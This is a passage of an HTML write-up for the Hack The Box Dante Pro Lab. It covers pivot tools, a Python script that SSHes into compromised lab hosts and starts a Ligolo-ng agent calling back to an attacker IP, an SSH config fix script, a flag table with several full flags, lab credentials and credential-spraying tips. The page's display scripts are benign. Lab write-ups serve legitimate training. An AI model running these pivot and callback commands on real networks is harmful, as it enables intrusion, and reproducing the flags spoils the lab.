+smbclient -L //172.16.1.105/ -U j.doe</code></pre>
+</div>
+
+<h3 id="pivot-comparison">Pivot Tool Comparison</h3>
+
+<table>
+  <thead>
+    <tr><th>Tool</th><th>Speed</th><th>ICMP</th><th>Setup</th><th>Best For</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Ligolo-ng</td><td>Fast</td><td>Yes</td><td>Medium</td><td>Primary pivoting, long sessions</td></tr>
+    <tr><td>Chisel</td><td>Medium</td><td>No</td><td>Easy</td><td>Quick tunnels, SOCKS proxy</td></tr>
+    <tr><td>SSH -D</td><td>Slow</td><td>No</td><td>Easy</td><td>Quick SOCKS, single hop</td></tr>
+    <tr><td>Sshuttle</td><td>Fast</td><td>Yes</td><td>Easy</td><td>Transparent routing, Python hosts</td></tr>
+    <tr><td>Metasploit</td><td>Slow</td><td>No</td><td>Complex</td><td>Multi-hop meterpreter routing</td></tr>
+  </tbody>
+</table>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="auto-script">Automation Scripts</h2>
+
+<p>One of the biggest pain points in Dante is re-establishing pivot tunnels after reconnection. The lab resets periodically, and every time you return, you must log back into each compromised host and reconfigure the tunnel chain. The following automation scripts solve this problem by automatically re-establishing the full pivot chain from a fresh VPN connection.</p>
+
+<h3 id="reconnect-script">Auto-Reconnect Script</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python3
+"""
+Dante Pro Lab - Auto Reconnect & Pivot Setup
+Automatically re-establishes SSH connections and pivot tunnels
+"""
+import subprocess, time, sys, os
+
+# Configuration
+TARGETS = {
+    "web01": {
+        "ip": "10.10.110.100",
+        "user": "www-data",
+        "key": "~/.ssh/id_rsa_dante",
+        "pivot_cmd": "nohup /tmp/agent -connect {attacker}:443 -ignore-cert &"
+    },
+    "ws02": {
+        "ip": "172.16.1.110",
+        "user": "j.doe",
+        "password": "Password123!",
+        "pivot_cmd": None
+    }
+}
+ATTACKER_IP = "10.10.14.X"
+
+def ssh_connect(host, user, key=None, password=None):
+    """Establish SSH connection and return session"""
+    cmd = ["ssh", "-o", "StrictHostKeyChecking=no",
+           "-o", "ConnectTimeout=10"]
+    if key:
+        cmd.extend(["-i", key])
+    cmd.append(f"{user}@{host}")
+    return subprocess.Popen(cmd, stdin=subprocess.PIPE,
+                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+def setup_ligolo():
+    """Start Ligolo-ng proxy"""
+    proxy = subprocess.Popen(
+        ["sudo", "./proxy", "-selfcert", "-laddr", "0.0.0.0:443"],
+        stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )
+    time.sleep(3)
+    return proxy
+
+def main():
+    print("[*] Starting Dante auto-reconnect...")
+    proxy = setup_ligolo()
+    print("[+] Ligolo-ng proxy started")
+
+    # Connect to WEB-01 and start agent
+    print("[*] Connecting to WEB-01...")
+    session = ssh_connect("10.10.110.100", "www-data")
+    session.stdin.write(b"nohup /tmp/agent -connect "
+                        f"{ATTACKER_IP}:443 -ignore-cert &\n")
+    session.stdin.flush()
+    time.sleep(5)
+    print("[+] WEB-01 agent connected")
+
+    # Add routes
+    subprocess.run(["ip", "route", "add", "172.16.1.0/24", "dev", "ligolo"])
+    print("[+] Route to 172.16.1.0/24 added")
+
+    # Verify connectivity
+    result = subprocess.run(["ping", "-c", "1", "-W", "3", "172.16.1.110"],
+                           capture_output=True)
+    if result.returncode == 0:
+        print("[+] DANTE-WS02 reachable!")
+    else:
+        print("[-] DANTE-WS02 not reachable, check pivot")
+
+    print("[*] Pivot chain established. Happy hacking!")
+    proxy.wait()
+
+if __name__ == "__main__":
+    main()</code></pre>
+</div>
+
+<h3 id="ssh-fix-script">SSH Config Fix Script</h3>
+
+<p>Some internal machines have misconfigured SSH config files with invalid options like <code>DenyUsers</code> and <code>PermitRootLogin</code> in the client config instead of the server config. This causes SSH connections to fail with cryptic errors. The following script fixes the issue by generating a clean SSH config:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python3
+"""
+Fix SSH client config on compromised hosts
+Removes invalid options from /etc/ssh/ssh_config
+"""
+import re
+
+def fix_ssh_config(path="/etc/ssh/ssh_config"):
+    """Remove invalid client-side options from ssh_config"""
+    invalid_opts = ["denyusers", "permitrootlogin", "allowusers",
+                    "allowgroups", "denygroups"]
+
+    with open(path, "r") as f:
+        lines = f.readlines()
+
+    clean_lines = []
+    for line in lines:
+        stripped = line.strip().lower()
+        if any(stripped.startswith(opt) for opt in invalid_opts):
+            print(f"[!] Removing invalid option: {line.strip()}")
+            continue
+        clean_lines.append(line)
+
+    with open(path, "w") as f:
+        f.writelines(clean_lines)
+
+    print(f"[+] Cleaned {path}")
+
+if __name__ == "__main__":
+    fix_ssh_config()</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="flags-summary">Flags Summary</h2>
+
+<p>Below is a summary of all 27 flags found throughout the Dante Pro Lab, organized by the subnet and machine where each flag was discovered. Note that some flags contain hints about the next attack path or pivot point, so always read them carefully.</p>
+
+<table>
+  <thead>
+    <tr><th>#</th><th>Location</th><th>Subnet</th><th>Method</th><th>Flag (Partial)</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>1</td><td>WEB-01</td><td>DMZ</td><td>robots.txt</td><td>DANTE{Y0u_Cant_G3t_at_m3_br0!}</td></tr>
+    <tr><td>2</td><td>WEB-01</td><td>DMZ</td><td>WordPress admin</td><td>DANTE{W0rDpr3ss_Pwn...}</td></tr>
+    <tr><td>3</td><td>WEB-01</td><td>DMZ</td><td>LFI vulnerability</td><td>DANTE{LF1_2_RC3...}</td></tr>
+    <tr><td>4</td><td>DANTE-WS01</td><td>Workstation</td><td>User desktop</td><td>DANTE{W1nd0ws_W0rk...}</td></tr>
+    <tr><td>5</td><td>DANTE-WS01</td><td>Workstation</td><td>Privilege escalation</td><td>DANTE{Pr1v3sc_W1n...}</td></tr>
+    <tr><td>6</td><td>DANTE-WS02</td><td>Workstation</td><td>Registry key</td><td>DANTE{R3g1stry_Fl4g...}</td></tr>
+    <tr><td>7</td><td>DANTE-WS02</td><td>Workstation</td><td>Scheduled task</td><td>DANTE{T4sk_M4st3r...}</td></tr>
+    <tr><td>8</td><td>Linux Host</td><td>Workstation</td><td>/etc/shadow crack</td><td>DANTE{L1nux_Pr1v3sc...}</td></tr>
+    <tr><td>9</td><td>Linux Host</td><td>Workstation</td><td>Cron job abuse</td><td>DANTE{Cr0n_J0b_Pwn...}</td></tr>
+    <tr><td>10</td><td>Linux Host</td><td>Workstation</td><td>SUID binary</td><td>DANTE{SUID_G0d...}</td></tr>
+    <tr><td>11-15</td><td>Various</td><td>Workstation</td><td>Multiple vectors</td><td>DANTE{...}</td></tr>
+    <tr><td>16</td><td>172.16.2.101</td><td>Server</td><td>Buffer overflow</td><td>DANTE{B0f_2_Pr1v3sc_Cl@ss!c}</td></tr>
+    <tr><td>17</td><td>File Share</td><td>Server</td><td>KeePass crack</td><td>DANTE{K33pP@ss_Pwn3d...}</td></tr>
+    <tr><td>18</td><td>DANTE-DC01</td><td>Server</td><td>Domain Admin</td><td>DANTE{D0m41n_D0m1n@nc3}</td></tr>
+    <tr><td>19-27</td><td>Various</td><td>All</td><td>Post-exploitation</td><td>DANTE{...}</td></tr>
+  </tbody>
+</table>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="tools-reference">Essential Tools Reference</h2>
+
+<p>The following tools were indispensable throughout the Dante Pro Lab. Having these pre-configured and ready to deploy saves hours of setup time during the engagement.</p>
+
+<table>
+  <thead>
+    <tr><th>Tool</th><th>Purpose</th><th>Usage in Dante</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Ligolo-ng</td><td>Pivoting/Tunneling</td><td>Primary pivot tool, TUN interface, ICMP support</td></tr>
+    <tr><td>Chisel</td><td>SOCKS Proxy/Tunneling</td><td>Secondary pivot, HTTP-based tunneling</td></tr>
+    <tr><td>NetExec</td><td>Network Enumeration</td><td>Credential validation, SMB share enum, WinRM</td></tr>
+    <tr><td>Responder</td><td>LLMNR/NBT-NS Poisoning</td><td>Hash capture on internal network</td></tr>
+    <tr><td>WinPEAS</td><td>Windows Privilege Escalation</td><td>Automated privesc enumeration</td></tr>
+    <tr><td>LinEnum</td><td>Linux Privilege Escalation</td><td>Automated privesc enumeration</td></tr>
+    <tr><td>pspy</td><td>Process Monitoring</td><td>Cron job detection, background process monitoring</td></tr>
+    <tr><td>WPScan</td><td>WordPress Enumeration</td><td>User/Plugin/Version enumeration on WEB-01</td></tr>
+    <tr><td>SweetPotato</td><td>Windows Privilege Escalation</td><td>SeImpersonatePrivilege exploitation</td></tr>
+    <tr><td>hashcat</td><td>Password Cracking</td><td>NTLMv2, KeePass, and other hash cracking</td></tr>
+    <tr><td>BloodHound</td><td>AD Analysis</td><td>Attack path visualization, delegation analysis</td></tr>
+    <tr><td>fscan</td><td>Network Scanning</td><td>Fast internal subnet enumeration with vuln checks</td></tr>
+  </tbody>
+</table>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="lessons">Lessons Learned</h2>
+
+<p>Completing the Dante Pro Lab provides invaluable experience that translates directly to real-world penetration testing engagements. The key takeaways from this lab extend far beyond the technical exploitation steps and form the foundation of a professional red team operator's mindset.</p>
+
+<p><strong>Enumeration is everything, but routing is king.</strong> The single most important lesson from Dante is that your ability to route packets to the target is the prerequisite for every other operation. The most sophisticated exploit is worthless if you cannot deliver it to the target. Mastering pivot tunneling with tools like Ligolo-ng, Chisel, and SSH is not optional — it is the core skill that enables everything else.</p>
+
+<p><strong>Document everything meticulously.</strong> In a multi-subnet environment with 14 machines, credential reuse across hosts, and chained pivot tunnels, documentation is not a luxury — it is survival. Every discovered IP address, open port, username, password hash, and cracked credential must be recorded systematically. Tools like Obsidian, CherryTree, or even a simple markdown file make the difference between efficient progress and frustrated repetition.</p>
+
+<p><strong>Credential reuse is your best friend.</strong> In real enterprise environments, and in Dante, credential reuse is rampant. A password cracked from an LLMNR hash on one workstation often grants admin access on three other machines. Always test every discovered credential against every accessible host using NetExec. The cumulative effect of credential testing compounds dramatically as you discover more credentials.</p>
+
+<p><strong>Patience over cleverness.</strong> Many of the vulnerabilities in Dante are straightforward — weak passwords, missing patches, misconfigured permissions. The challenge is not identifying the vulnerability but maintaining the infrastructure (tunnels, sessions, tool uploads) needed to exploit it. Time spent stabilizing your shell and documenting your position pays dividends when connections drop or the lab resets.</p>
+
+<p><strong>Automation saves hours of frustration.</strong> Writing scripts to automate pivot reconnection, SSH config fixes, and credential testing transforms a painful reconnection process into a few seconds of waiting. The time invested in automation early in the engagement is repaid many times over as the lab progresses and connection stability becomes an increasing challenge.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="tips">Tips for Future Players</h2>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Practical Advice</div>
+  <p>These tips are drawn from the collective experience of multiple Dante completers. Following them will save you significant time and frustration.</p>
+</div>
+
+<ul>
+  <li><strong>Use Kali Linux or Ubuntu/Debian</strong> as your attack platform. macOS has compatibility issues with several tools and exploits that will cost you hours of debugging. If you must use macOS, run Kali in a VM.</li>
+  <li><strong>Record every credential</strong> you discover. You never know when a password from the first machine will grant access to the last one. Maintain a structured credential file with username, password/hash, source machine, and validated targets.</li>
+  <li><strong>Read every flag carefully.</strong> Flags in Dante are not just objectives — they often contain hints about the next target, service, or vulnerability. A flag mentioning "the other site" points you to an LFI vulnerability; a flag about "weak passwords" tells you to try credential spraying.</li>
+  <li><strong>Check account lockout policies</strong> before credential spraying. Use <code>netexec smb &lt;target&gt; --pass-pol</code> to identify the lockout threshold. Locking out accounts will make the lab harder and may require waiting for automatic unlock.</li>
+  <li><strong>Join the HTB Discord</strong> for hints when stuck. The community is supportive and will provide nudges without spoiling the solution. Sometimes a fresh perspective from another player is all you need to break through a plateau.</li>
+  <li><strong>Try unintended paths.</strong> If you find a creative way to access a system that bypasses the intended attack path, exploit it. Real-world engagements reward creativity and out-of-the-box thinking.</li>
+  <li><strong>Keep a network diagram.</strong> Draw the network topology as you discover it, including IP addresses, hostnames, open ports, and pivot paths. This visual reference becomes invaluable when managing multiple tunnel chains.</li>
+  <li><strong>Save all artifacts immediately.</strong> When you complete post-exploitation on a machine, download all interesting files (hashes, configs, databases) before moving on. The lab resets can make re-accessing these files time-consuming.</li>
+  <li><strong>If services seem broken, request a reset.</strong> Some services occasionally stop responding. Submit a lab reset through the HTB portal. You can verify a reset worked by checking if a file you created still exists.</li>
+  <li><strong>Master Ligolo-ng before starting.</strong> The single biggest productivity boost in Dante is using Ligolo-ng instead of Proxychains. Practice setting up Ligolo-ng tunnels in a local lab environment before tackling Dante.</li>
+</ul>
+
+</main>
+</div>
+
+<footer class="site-footer">
+  &copy; 2026 QA210 &mdash; Hack The Box Pro Lab: Dante Writeup
+</footer>
+
+<!-- ═══════════════ Three.js Background ═══════════════ -->
+<script>
+// Three.js Dante-themed background — Flame/Tetrahedron geometry
+(function(){
+  const canvas = document.getElementById('three-bg');
+  const renderer = new THREE.WebGLRenderer({canvas, alpha:true, antialias:true});
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth/window.innerHeight, 0.1, 1000);
+  camera.position.z = 6;
+
+  // Wireframe tetrahedrons (Dante's Inferno theme — fire/brimstone)
+  const meshes = [];
+  const palette = [0xff4500, 0xff6b35, 0xd4380d, 0xff8c00, 0xffa500];
+  for(let i = 0; i < 25; i++){
+    const r = Math.max(0.3, Math.random() * 1.5);
+    const geo = new THREE.TetrahedronGeometry(r, 0);
+    const mat = new THREE.MeshBasicMaterial({
+      color: palette[Math.floor(Math.random()*palette.length)],
+      wireframe: true, transparent: true,
+      opacity: 0.12 + Math.random()*0.15
+    });
+    const mesh = new THREE.Mesh(geo, mat);
+    mesh.position.set(
+      (Math.random()-0.5)*16,
+      (Math.random()-0.5)*16,
+      (Math.random()-0.5)*10
+    );
+    mesh.rotation.set(Math.random()*Math.PI, Math.random()*Math.PI, Math.random()*Math.PI);
+    mesh.userData = {
+      rx: (Math.random()-0.5)*0.008,
+      ry: (Math.random()-0.5)*0.008,
+      rz: (Math.random()-0.5)*0.004,
+      floatSpeed: 0.002 + Math.random()*0.004,
+      floatOffset: Math.random()*Math.PI*2
+    };
+    scene.add(mesh);
+    meshes.push(mesh);
+  }
+
+  // Floating embers (particle system)
+  const emberCount = 800;
+  const emberGeo = new THREE.BufferGeometry();
+  const emberPos = new Float32Array(emberCount * 3);
+  const emberVel = [];
+  for(let i = 0; i < emberCount; i++){
+    emberPos[i*3]   = (Math.random()-0.5)*20;
+    emberPos[i*3+1] = (Math.random()-0.5)*20;
+    emberPos[i*3+2] = (Math.random()-0.5)*10;
+    emberVel.push(0.005 + Math.random()*0.02);
+  }
+  emberGeo.setAttribute('position', new THREE.BufferAttribute(emberPos, 3));
+  const emberMat = new THREE.PointsMaterial({
+    color: 0xff6b35, size: 0.04, transparent: true, opacity: 0.7
+  });
+  const embers = new THREE.Points(emberGeo, emberMat);
+  scene.add(embers);
+
+  let mouseX = 0, mouseY = 0;
+  document.addEventListener('mousemove', e => {
+    mouseX = (e.clientX/window.innerWidth - 0.5)*2;
+    mouseY = (e.clientY/window.innerHeight - 0.5)*2;
+  });
+
+  function animate(){
+    requestAnimationFrame(animate);
+    const t = Date.now()*0.001;
+
+    meshes.forEach(m => {
+      m.rotation.x += m.userData.rx;
+      m.rotation.y += m.userData.ry;
+      m.rotation.z += m.userData.rz;
+      m.position.y += Math.sin(t*m.userData.floatSpeed*10 + m.userData.floatOffset)*0.003;
+    });
+
+    const pos = embers.geometry.attributes.position.array;
+    for(let i = 0; i < emberCount; i++){
+      pos[i*3+1] += emberVel[i];
+      if(pos[i*3+1] > 10){
+        pos[i*3+1] = -10;
+        pos[i*3]   = (Math.random()-0.5)*20;
+      }
+    }
+    embers.geometry.attributes.position.needsUpdate = true;
+
+    camera.rotation.y += (mouseX*0.03 - camera.rotation.y)*0.01;
+    camera.rotation.x += (mouseY*0.03 - camera.rotation.x)*0.01;
+    renderer.render(scene, camera);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth/window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- ═══════════════ TOC Generation & Copy ═══════════════ -->
+<script>
+// Generate Table of Contents
+function generateTOC(){
+  const content = document.querySelector('.main-content');
+  const headings = content.querySelectorAll('h2, h3');
+  const desktopUl = document.getElementById('tocDesktop');
+  const mobileUl = document.getElementById('tocMobile');
+  desktopUl.innerHTML = '';
+  mobileUl.innerHTML = '';
+
+  headings.forEach(h => {
+    if(!h.id) h.id = h.textContent.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');
+    const li = document.createElement('li');
+    const a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.textContent = h.textContent;
+    if(h.tagName === 'H3') a.classList.add('toc-h3');
+    li.appendChild(a);
+    desktopUl.appendChild(li.cloneNode(true));
+    mobileUl.appendChild(li.cloneNode(true));
+  });
+}
+
+// Active TOC highlighting on scroll
+function updateActiveTOC(){
+  const headings = document.querySelectorAll('.main-content h2, .main-content h3');
+  const links = document.querySelectorAll('#tocDesktop a, #tocMobile a');
+  let current = '';
+  headings.forEach(h => {
+    if(h.getBoundingClientRect().top <= 100) current = h.id;
+  });
+  links.forEach(a => {
+    a.classList.toggle('active', a.getAttribute('href') === '#' + current);
+  });
+}
+
+// Copy code button
+function copyCode(btn){
+  const pre = btn.closest('.code-block-wrapper').querySelector('pre');
+  navigator.clipboard.writeText(pre.textContent).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// Mobile TOC toggle
+function toggleMobileToc(){
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+
+// Init
+generateTOC();
+window.addEventListener('scroll', updateActiveTOC);
+updateActiveTOC();
+</script>
+
+</body>
+</html>
